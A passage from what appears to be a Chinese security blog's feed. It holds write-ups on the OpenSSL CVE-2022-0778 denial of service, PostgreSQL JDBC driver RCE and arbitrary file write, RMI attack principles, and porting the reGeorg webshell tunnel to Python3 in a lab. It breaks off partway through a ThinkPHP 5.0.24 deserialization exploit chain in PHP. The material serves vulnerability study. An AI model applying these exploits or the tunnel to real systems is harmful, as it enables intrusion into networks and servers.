openssl-devel</code>安装依赖<br>ubuntu执行<br><code>apt-get install libssl-dev</code>安装依赖<br>然后运行编译好的可执行文件<br><code>./my_bad_sqrt</code><br>然后依旧会看到终端一直卡起了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4210eab367d720ea7462d79068a07909.png" alt="在这里插入图片描述"><br>我们去看一下CPU的占用情况<br><img src="https://i-blog.csdnimg.cn/blog_migrate/df6bcb9d766c7c420438c771652089ba.png" alt="在这里插入图片描述"><br>效果直接拉满好吗<br>看了一下poc的写法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9c934f6a8589937bdce039a9c4335a8f.png" alt="在这里插入图片描述"><br>很简单，先申请空间，然后将十进制字符串a与p转换为大数,然后调用BN_mod_sqrt函数，想来这个函数就在openssl&#x2F;bn.h这个头文件里头。</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>CVE-2022-0778</tag>
        <tag>openssl</tag>
        <tag>Dos</tag>
        <tag>拒绝服务</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL JDBC Driver RCE&amp;任意文件写入漏洞</title>
    <url>/archives/dbd438c0.html</url>
    <content><![CDATA[<p>上班没有任务你们都干什么，反正我是不会摸鱼的，这辈子都不可能摸鱼的，复现这个漏洞的初衷是看了某公众号关于Vmware Workspace One Access的jdbc注入漏洞，文中值分析到jdbc url可控的部分，但是我不太清楚为什么jdbc可控就会导致任意文件写入，于是上网搜了jdbc注入的文章，于是找到了这儿：</p>
<span id="more"></span>
<blockquote>
<p><a href="https://paper.seebug.org/1832/">https://paper.seebug.org/1832/</a></p>
</blockquote>
<p>这篇文章里介绍了Mysql 的JDBC驱动可能导致的漏洞的分析，不过这好像不是我需要的，不过我还是学习了一波，具体的调用流程我还没有看，准备咋写完这篇就去看看。后来我又在刚才提到的公众号里找到了另一篇将PostGreSQL的注入分析，于是我就跟着分析了一波。这篇文章里介绍了两个漏洞一个是RCE，另一个是任意文件写入漏洞。</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>首先我们创建一个MAVEN项目，然后引入相关的依赖：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5ced078929b993db8057524c1e367ab0.png" alt="在这里插入图片描述"><br>然后编写一个漏洞利用POC。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/32449109031c3fc2a331e246a6cacf49.png" alt="在这里插入图片描述"><br>很明显导致漏洞的是jdbcURL的socketFactory与socketFactoryArg这两个参数，在jdbcURL的定义中，参数部分一般被称作扩展参数，其总用是指定连接数据库的一些特性。大胆cancel导致漏洞的就是这两个参数，而这个漏洞的kick-off就是DriverManager.getConnection这个类方法。那么我们接下来要做的就是不断跟踪这个函数的Chain最终找到sink点。直接开干，毫无疑问我们要使用调试模式将代码跑起来，然后键入到getConnection函数里面。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/064c6d4ca7a7331a6e695e5d01c6a6d2.png" alt="在这里插入图片描述"><br>无意义的部分我就直接放图片了，需要关注的地方我会说明<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7392fcc25dc3f316af36782dc20f0293.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/ccbaeb08422697f7a4fb4670f23057dd.png" alt="在这里插入图片描述"><br>这里注意注意第151行</p>
<blockquote>
<p>this.setupLoggerFromProperties(props);</p>
</blockquote>
<p>这与我们的任意文件写入有关，当然现在我们不关注他，这个时候我们可以看一下props的值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ab3aaf9cdbd7f4e7a764c52c68ff5b62.png" alt="在这里插入图片描述"><br>存储的都是jdbcRUL含有的一些关键信息，具体的实现步骤我当然是一步一步看了的，有新区的可以自己看看。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d9714883310a8c2d83f1b6538fcdf8b6.png" alt="在这里插入图片描述"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9c41a90e6a0b2680b1ba52b62aa8cff6.png" alt="在这里插入图片描述"><br>这里对props进行了处理，最终生成的是一个hostSpecs类型的数组，hostSpecs对象存储了数据库连接的hostnae, port以及一个扩展参数localSocketAddress，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8e662319025a149bd51fcb4a54792ca8.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/371c3ab18de2f8e22781466536dc56e4.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/dd9ed18eb4931c726f21b622b0886322.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ac4cbac510fe44fe69ab979e601d56d.png" alt="在这里插入图片描述"><br>这个时候可以看一波这个info存储的信息了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/403ae02a564320dedc0f27f2c54d2a05.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/df2ae255020b698ba90dea5bf60ce140.png" alt="在这里插入图片描述"><br>这里注意第三个参数<code>PGProperty.SOCKET_FACTORY_ARG</code>，PGProperty是一个枚举类型，其内部定义了get方法，实现的功能是对判断枚举项的值有没有在传入的properties中，如果在则查找返回，如果不在则返回默认值。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7ce33e988bcb94a35fd158b484e500f9.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a4f33fffdfd9632bb4a02a46150e3ae.png" alt="在这里插入图片描述"><br>可以看到有很多的枚举项，这些内容很大一部分都是JDBC的扩展参数的可选值。<br>在我们的代码中这个值就是<code>args</code>也就是我们最开始poc设置的参数<code>socketFactoryArg</code><br>还可以看一看第一个参数的值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/56340d55a62456873cb62038ab7c52f3.png" alt="在这里插入图片描述"><br>就是最开始设置的参数<code>socketFactoryClass</code><br>然后跟进这个函数<code>instantiate</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/90be4014a268634cde7e700a2425fda1.png" alt="在这里插入图片描述"><br>很明显的反射调用，第一个参数作为类名，第三个参数作为构造方法的参数，那么这个函数<code>ObjectFactory.instantiate</code>就是我们的sink点了。<br>现在我们要找到一个gadget能够在在类实例化的过程中实现RCE，作者根据jackson的历史漏洞<code>CVE-2017-17485</code>找到这么一个类<br><code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 该类在实例化的时候会下载出入的参数指定的xml文件然后获取java bean，然后通过jpel表达式执行恶意代码。<br>完整的poc长这样<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2281dffccbdcbb3e7ef26beb6c41b4d6.png" alt="在这里插入图片描述"><br>当然过去jdbc连接的用户名根本不用填，根本用不上。<br>xml文件长这样：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d32339c5218d29b8d0b34a29ee52d131.png" alt="在这里插入图片描述"><br>然后直接运行代码<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f5ff4c93c580108a6d0240e6a85db852.png" alt="在这里插入图片描述"><br>完美</p>
<h1 id="任意文件写"><a href="#任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h1><p>这个也比较简单，上面有提到过，重点在<code>this.setupLoggerFromProperties(props);</code>里面设置了日志处理器，在调用该logger的时候就会使用该处理器将日志记录到指定的日志文件中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2163e134a61bb522243e3e445f0eeca2.png" alt="在这里插入图片描述"><br>这里注意要设置jdbc扩展参数<code>logger_level</code>设置日志记录的级别，当然不能为off，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/829303d5d04f95aadbb7c8cb22f66df3.png" alt="在这里插入图片描述"><br>设置扩展参数<code>logger_file</code>指定日志文件的路径，这里没有对路径进行过滤，所以可以进行目录穿越，将文件指定到想要的位置。</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/763faa16a6ecaf5bf292864d963eb372.png" alt="在这里插入图片描述"><br>这个文件处理器最终被添加到了<code>Parent_LOGGER</code>这个日志记录器中<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a9a2b6ea66b5222132b9b34ef86ba49e.png" alt="在这里插入图片描述"><br>在执行完<code>setupLoggerFromProperties(props)</code>后，马上就有记录日志的操作，该操作将整个jdbcUrl记录到日志中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10dcb0eb1dd3852c53c60fd860fbd202.png" alt="在这里插入图片描述"><br>注意到这里的日志记录器并不是<code>PARENT_LOGGER</code>而是<code>LOGGER</code>，那么他是怎么调用到父记录器的呢，这个可以自己跟一下log的流程看一下怎么获取的，最终的poc与效果<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1f0bd72347a1eb74e185be6a2a08c8f9.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>任意文件写</tag>
        <tag>Postgre</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI原理浅析</title>
    <url>/archives/1298d583.html</url>
    <content><![CDATA[<p>@<a href="RMI%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90">TOC</a><br>前段时间不是爆了个log4j的远程代码执行漏洞吗！趁机我就了解了一下什么事jndi，然后就接触到了ldap与rmi，所有准备好好学习一番……</p>
<p>以上内容纯属瞎编，如有雷同，绝对是巧合。</p>
<p>其实很久以前就了解过jndi，但那时候感觉积累不够深，所有一直对他的原理没有搞清楚，看的各种文章也是云里雾里的，直到最近在反复研磨了网络上的文章之后，终于有了一点点心得，特此在这里记录一下。</p>
<span id="more"></span>
<p>参考文章：<br><a href="https://www.cnblogs.com/nice0e3/p/14280278.html">Java安全之RMI协议分析</a><br><a href="https://blog.csdn.net/he_and/article/details/105532007?spm=1001.2014.3001.5501">【入坑JAVA安全】RMI基础看这一篇就足够了</a></p>
<p>RMI，顾名思义，远程方法调用。就是通过网络调用远程的对象方法实现特定功能的一种协议，java中RMI协议的实现依赖于java的反序列化机制以及JRMP协议或者IIOP协议，至于这两种协议是什么，暂时还没有研究，以后有机会了再研究研究。<br>这里先甩出来RMI的通信模型：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8b70ec8c0be1edfe10c5c3e2c928721c.png" alt="在这里插入图片描述"><br>首先我们需要一个注册中心、一个客户端、一个服务器。注册中心注册了服务器上的方法，客户端通过访问注册中心获得对应方法的代理对象，我们称之为stub，然后通过这个代理对象去访问目标服务器的代理，我们称之为skeleton,，目标服务器通过客户端传过来的方法名以及参数执行对应的方法，让后将结果返回个客户端代理对象，客户端代理对象再将结果返回给客户端。<br>这里需要明确的一点就是，客户端的代理对象，也就是存根并不是客户端自己生成的，而是由注册中心生成并返回的，因为服务器生成的代理，即骨架是随机导出到某一个端口的，这个端口只有注册了该方法的注册中兴知道，而客户端并不知道，而客户端要获取这个ip以及端口的话只能向注册中心查询。</p>
<p>代码层面的理解：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/23f14a6c729231de63bb294151a6234b.png" alt="在这里插入图片描述"><br>上图是向注册中心注册对象的简单的操作步骤，11行首先获取了一个超市对象实例，12行创建了一个注册中心，13行将对象实例绑定到了注册中心里，当rebind被执行的时候会对第二个参数调用getClass方法获得一个类名，然后加上后缀_stub，加载到内存中，让后获取一个remoteRef对象，该对象就存放着服务器的信息，然后将该对象传递到注册中兴进行绑定就获得获得了一个stub对象。客户端通过访问注册中心的1099端口，来获得某一个对象的stub代理。注册中心实际上维护了一个hash表，表示了名称到对象的映射关系，当客户端携带对应的market来查找时，注册中心就会返回对应的stub代理。<br>为了验证我们的理论，我花了一点时间住了一下RMI协议通行过程中的数据包。</p>
<p>【兄弟们，这张图我画错了，这所有的请求都是在执行lookup方法时才会发送的，欲知详情请参考我的下一篇文章：<a href="https://blog.csdn.net/qq_32731075/article/details/122280860?spm=1001.2014.3001.5501">从代码层面看RMI规范的实现与攻击原理（一）</a>】<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c8351e449a79ae9ec586828d3097b1f4.png" alt="在这里插入图片描述"><br>感兴趣的同学可以自己抓一下看看。</p>
<p>我们需要注意到的是，客户端与注册中心，客户端与服务器之间的对象传递是通过java的序列化与反序列化来实现的，那么就衍生出了java的反序列化攻击。需要注意的是调用方法的执行是在服务器上面，但因为服务器往往与注册中兴是在同一个JVM上，所以反序列化攻击的对象往往是注册中心所在的设备，而不是客户端。</p>
<p>而 在攻击的时候通常有三种方式</p>
<p>第一种方式：</p>
<p>客户端在向注册中心进行lookup前首先需要获取一个注册中心，既然有了注册中心，那么我们就可以进行bind与rebind操作<br>这样我们就可以手动注册一个恶意对象到注册中心，当该恶意对象再被注册的时候前面提到会调用getClass方法获取类名，这个过程中如果我没有记错是会调用静态代码块中的内容，这样我们的恶意代码就被执行了。getClass方法其实就是获取了一个类的Class对象实例，然后其对应的所有类实例都是通过这个Class对象实例生成的，而在获取Class对象实例的过程中就会调用静态代码块中的内容。听起来好像逻辑自洽了，但是不知道对不对，仅供参考。</p>
<p>第二种方式：</p>
<p>第二种方式就是直接调用服务器端有问题的方法来实现我们攻击的目的。</p>
<p>第三种方式：</p>
<p>通过RMI的动态类加载机制来加载恶意类，感觉这种方式是被利用的最多的，最近的log4j2漏洞也是通过这种方式来利用的。<br>正是因为这个机制，所以你应该知道了你在网络上找的JNDI搭建工具如marshalsec这种为甚么需要你启动一个web服务器，然后把恶意类的字节码文件扔到里面就可以了。<br>这个万一的原理我还没读，明天再读读。</p>
<p>今晚有点烦躁，或者说最近都有点烦躁，所以写这篇文章时感觉就想是觉得必须要写了一样，自己都感觉写的很差劲，没有进行合理的编排布局，感觉就是胡乱得在堆砌知识点。</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>Regeorg 从python2改造为python3-从实战中学习socks5协议</title>
    <url>/archives/97967489.html</url>
    <content><![CDATA[<p>这两天没啥工作，一般这时候我都不会发挥自己的主观能动性去主动找活，于是乎只能上网看看博客，提升提升自己的技术。想起在这家公司呆久了把内网方面本来就不多的知识都快丢光了，于是乎趁着难得清闲准备补充补充营养。看了一些与内网穿透相关的博客，准备实操的时候遇到了麻烦。本着逢山开路遇水架桥的精神，今天势必要把这个问题拿下。</p>
<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>Regeorg是只提供了对python2的支持，使用python3来运行爆了一大串错我，今天咱就一个问题一个问题得搞定，手把手教你怎么把Regeorg改造成python3版本。看了下这个项目8年前年就停止更新了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/97ecb5ee4338329ab06c0b030df7da84.png" alt="在这里插入图片描述"></p>
<span id="more"></span>
<h1 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><table>
<thead>
<tr>
<th>平台</th>
<th>ip地址</th>
</tr>
</thead>
<tbody><tr>
<td>物理机（windows11）</td>
<td>192.168.1.101</td>
</tr>
<tr>
<td>虚拟机1（centos7）</td>
<td>双网卡192.168.248.146(nat)、172.16.128.2(仅主机模式)</td>
</tr>
<tr>
<td>虚拟机2（windows7）</td>
<td>172.16.128.1(仅主机模式，搭建了web服务器)</td>
</tr>
<tr>
<td>物理机作为我们的攻击机，可以正常与虚拟机1通信，虚拟机1安装了web服务作为受控主机，可正常与物理机与虚拟机2通信，虚拟机2模拟内网主机，仅能与虚拟机1通信不能与物理机通信</td>
<td></td>
</tr>
</tbody></table>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先我们把项目 clone下来<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d531a71d517083d9bebe4aeb09d61e0f.png" alt="在这里插入图片描述"><br>因为被控主机的中间件解析器为PHP所以这里选择php后缀的脚本作为代理转发服务器，可以看到有两个php文件，他两的区别在于一个使用了dl加载动态链接库一个没有<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6302ac82d9c11e48049e198ddd612390.png" alt="在这里插入图片描述"><br>这么看来该文件只能在windows环境下使用，且因为PHP貌似是5.2之后就溢出了dl函数，所以我们不用这个文件而用tunnel.nosocket.php来作为代理服务器。当该文件被上传到受控主机后使用浏览器访问该文件<br><img src="https://i-blog.csdnimg.cn/blog_migrate/58625b0f130fb888f7066a19ac678cbc.png" alt="在这里插入图片描述"><br>如果看到这些字就证明服务器已就位，当然这个过程可能并不会那么顺利，你可能会遇到的问题为权限问题导致的文件不可用，这时候只需使用<code>linux</code>命令<code>chmod</code>给 <code>tunnel.nosocket.php</code>赋予更高的权限就ok了。<br>然后我么运行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8754 -u http://192.168.248.145/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>
<p>在我们的攻击机上起一个客户端<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fa058e1d062e8d304184d650d283e46a.png" alt="在这里插入图片描述"><br>报错了，这个很见到，把代码里所有的<code>except</code>语句中的逗号改成<code>as</code>就好了。然后运行又报错了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/98b84fedce2f56ca214ae1589a3389f6.png" alt="在这里插入图片描述"><br>这个也很简单，<code>print</code>的写法不对，改成<code>print()</code>就好了，再运行</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/7a6b1c432a99fd9eea79db8888ece049.png" alt="在这里插入图片描述"><br>说是少了模块，看一下怎么引入的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7bbc7c72185f3c3a55a613ba4cb04af3.png" alt="在这里插入图片描述"><br><code>python3</code>里面<code>urlparse</code>集成到<code>urllib</code>包里面，直接删掉这一行然后重新导入<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ecead071f4b5bbd407812026d4051afd.png" alt="在这里插入图片描述"></p>
<p>再运行虽然没有说没有报错但是提示了，<code>georg</code>没有准备好<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a84e9ac7cc5e22b2806783cdbc43f736.png" alt="在这里插入图片描述"><br>在代码里搜一下这句报错在哪儿出现的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e9c237dc00808f555a523bbb2d759238.png" alt="在这里插入图片描述"><br>看来是这行<code>askGeorg</code>返回了<code>False</code>，跟进去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ced66d140d30ac8e35728340dc47e33d.png" alt="在这里插入图片描述"><br>重点画红框的地方，内层的if语句没有进去，我们直接打印一下相关的值看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82e89d004969163ba8c14115fdad24ed.png" alt="在这里插入图片描述"><br>注意到<code>response.dat</code>返回的是字节类型与<code>BASICCHECKSTRING</code>的字符串类型肯定不相等，我们将<code>BASICCHECKSTRING</code>的类型修改为字节文本就<code>ok</code>了，记得不要再使用<code>strip</code>去除两端空白字符<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0ec6fa88abffe7b8479c6051b0212c39.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/7df90243bf7ab5b29611e562a4407c2c.png" alt="在这里插入图片描述"><br>再运行看起来ok了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/44eccbbfe4dc6f729a1dd632b5651cc4.png" alt="在这里插入图片描述"><br>当然事情没有那么简单，这时候我们使用<code>proxifier</code>将本地应用的流量代理到<code>regeorg</code>客户端试一下<br>配置代理服务器<br><img src="https://i-blog.csdnimg.cn/blog_migrate/76abbec7793072c7e1fde2a8a2df5250.png" alt="在这里插入图片描述"><br>配置代理规则<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6547dde1f41b35a9de072dfbe3fdb792.png" alt="在这里插入图片描述"><br>这里注意第一处红框处是为了让本地环回网卡的流量都通过直连的方式访问，避免死循环，第二处红框则是将使用chrome浏览器访问<code>172.16.128.1</code>的流量都转发到我们的<code>regeorg</code>客户端。然后我们用浏览器访问一下<code>172.16.128.1</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/5c8f58075f2a46b420c95e81b8f08bdc.png" alt="在这里插入图片描述"><br>发现访问失败了，而且<code>regeorg</code>客户端屁都没有冒，这肯定是哪里出现了问题，那么我们还是来调试一下</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/aba99a4b53948789d732d47502454885.png" alt="在这里插入图片描述"><br>最终的请求是由这条语句进行的那么我们跟进去看看，这里调用了<code>start</code>方法，应该是多线程的写法，所以我们直接去找<code>run</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/742086ad66da9674eadc46708c9c167d.png" alt="在这里插入图片描述"><br>注意到刚才控制台没有打印日志，也就是没有报错也没有进入if分支，也就是说，if的判断条件返回了<code>false</code>，那么跟进去看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2ba215498dff04709a1e3487da1be6d6.png" alt="在这里插入图片描述"><br>这里就是在对<code>socks</code>协议进行解析了，首先读取了一个字节，这里的第一个字节也就是使用的协议版本号，这里为<code>socks5</code>协议，我们打印一下看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a8b92d967f4a49d2092512c8eba00d50.png" alt="在这里插入图片描述"><br>很明显这里又是数据类型有问题，在<code>python2</code>中字节文本与文本字符串是不分开的所以无所谓，但<code>python</code>里做了严格的区分，所以这里我们将连个<code>if</code>判断条件改为字节文本。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/416ea62c6df5f7ee88081d90139d4f9c.png" alt="在这里插入图片描述"><br>再运行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/76cfa7252d15c299dd537ddf8bab7ca5.png" alt="在这里插入图片描述"><br>又报错了，这里说的是在141行需要一个字节对象，但给了一个字符串，那就到141行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/37e3efc518bf7d2004c79c68f6b722dc.png" alt="在这里插入图片描述"><br>这里的<code>VER</code>与<code>METHOD</code>为定义的两个字符串常量，我们知道<code>sockets</code>的<code>sendall</code>是不能发送字符串的需要对其进行编码，这里可以使用<code>encode</code>方法同一修改或者在其定义的地方修改<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ceeac2b3ba3c44fe58b54d3f0606667a.png" alt="在这里插入图片描述"><br>再运行，又报错<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0703ef906c9884e66280559026b329f5.png" alt="在这里插入图片描述"><br>说的是166行<code>None</code>类型不能进行切片，也就是说<code>targetPort</code>返回了<code>None</code>，去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e942c6c511496d40a72f12f185203247.png" alt="在这里插入图片描述"><br>那么再看看<code>targetPort</code>哪里来的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8e607021b4b8f987b760e045b0c62569.png" alt="在这里插入图片描述"><br>大意就是通过<code>atyp</code>的值，来判断<code>targetPort</code>的取值方式，这里很明显还是数据类型导致的，老规矩直接改成字节文本，同时注意到这里会继续对<code>proxifier</code>发过来的握手包进行解析，先解析两个字节，一个字节是<code>nmethods</code>，一个为<code>methods``，nmethods</code>表示可以使用的方法，<code>methods</code>表示方法的值。然后<code>regeorg</code>会选择可用的方法给<code>proxifier</code>回包告诉向客户端确认协议版本号以及使用的方法。这里看一下这几个参数的值</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5ad30111475af280ed290ec3dae3ae3a.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a1b501ffb0d39e593fdd3779a6ea606.png" alt="在这里插入图片描述"><br>然后<code>proxifier</code>会再回一个包，这里进行解析<br><img src="https://i-blog.csdnimg.cn/blog_migrate/304db3550a2ae2b4a9b29c291d0996b9.png" alt="在这里插入图片描述"><br>首先第一个字节任然是版本号，然后根据版本号的不同会有不同的解析方式，这里直接看<code>socks5</code>的格式<br>后面字节分别为命令，保留位以及目标类型，这里看一下值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fcf7266a7587289ac9b3ab14fed79f80.png" alt="在这里插入图片描述"><br>命令为01，也就是连接请求，保留位不管，然后是目标类型01也就是ipv4地址。<br>这些都了解了我们继续看报错的内容<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3a0ae96d858aac3a66887b752deea43a.png" alt="在这里插入图片描述"><br>说ord函数拿到了一个整数，但需要的是1个字符，这里直接改<br><img src="https://i-blog.csdnimg.cn/blog_migrate/002db315455703ef5072157e3d276ec3.png" alt="在这里插入图片描述"><br>再运行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/462d7582eb007c1a3b95ecc2327c0772.png" alt="在这里插入图片描述"><br>还是这儿不过报错内容变了，还是数据类型的问题，直接改就完了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/176be127ed8938f9f8efc3a0e05fb0f4.png" alt="在这里插入图片描述"><br>运行，看报错<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ab9f3cf728b02c6ca63667e371686f5f.png" alt="在这里插入图片描述"></p>
<p>这里说的是连接目标失败，然后我搜了这一句报错在代码里面没有，那么只有可能来自服务端的响应，去服务端搜<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b6f114b7d3786ad8062e0c88bcfe2db4.png" alt="在这里插入图片描述"><br>这一看就是socket连接失败了，然后我一看我虚拟机自动挂起了，重新开起来再运行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/834676e13418f033c9f5b1d41572ea24.png" alt="在这里插入图片描述"><br>又是数据类型问题，直接改<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1676c712ac01528957e13c058c8c6104.png" alt="在这里插入图片描述"><br>再运行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9d0b4e6115dab04a5e526c3f903181d1.png" alt="在这里插入图片描述"><br>搞定了，不过浏览器的渲染结果是这样的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e93be96c679b771f49e124bb63fc58fd.png" alt="在这里插入图片描述"><br>响应无效，说明是响应的问题，然后我使用<code>proxifier</code>代理了<code>burp</code>的流量看了下响应<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bc9496b44d736bf6b0cc1459df0d5f08.png" alt="在这里插入图片描述"><br>协议前头多了个<code>P</code>啊，这浏览器解析不了很正常，秉持着打破砂锅问到底的精神，我们还是要装样子看看这个<code>P</code>怎么来的，所以这里打印一下客户端从服务端获取的响应<br><img src="https://i-blog.csdnimg.cn/blog_migrate/caf0cbb99f1dfb5b61d66f8e36d0f54f.png" alt="在这里插入图片描述"><br>这也没有<code>P</code>啊，证明应该不是<code>regeorg</code>的问题，那么就是<code>proxifier</code>的问题了，这个就有点难搞了。。。</p>
]]></content>
      <categories>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>socks5</tag>
        <tag>Regeorg</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.0.24反序列化POC</title>
    <url>/archives/5ce634cf.html</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Driver</span>&#123;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * <span class="title class_">Driver</span> <span class="title class_">constructor</span>.</span><br><span class="line">         */</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; options = [</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; tag = <span class="string">&#x27;armandhe&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Memcached constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line">            <span class="string">&#x27;host&#x27;</span>     =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span>     =&gt; <span class="number">11211</span>,</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>   =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span>  =&gt; <span class="number">0</span>, <span class="comment">// 超时时间（单位：毫秒）</span></span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//账号</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//密码</span></span><br><span class="line">            <span 